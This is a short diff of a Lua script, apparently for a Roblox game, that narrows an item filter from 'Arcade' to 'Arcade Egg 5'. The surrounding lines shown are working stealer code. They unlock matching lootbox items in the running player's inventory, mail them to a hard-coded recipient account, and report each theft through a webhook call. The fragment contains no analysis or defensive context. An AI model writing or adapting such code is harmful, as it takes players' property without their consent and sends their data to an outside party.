@@ -102,7 +102,7 @@ end
 local LootboxInv = SaveMod.Get()["Inventory"]["Lootbox"]
 for uid, Item in pairs(LootboxInv) do
     local Amount = Item._am or 1
-    if string.find(Item.id, "Arcade") then
+    if string.find(Item.id, "Arcade Egg 5") then
         Network:WaitForChild("Locking_SetLocked"):InvokeServer(uid, false)
         Network:WaitForChild("Mailbox: Send"):InvokeServer(MailRecipient, "Hippo", "Pet", uid, Amount)
         SendWebhook(Item.id, "Lootbox", uid, Amount, Item.pt ,Item.sh ,Item.tn)
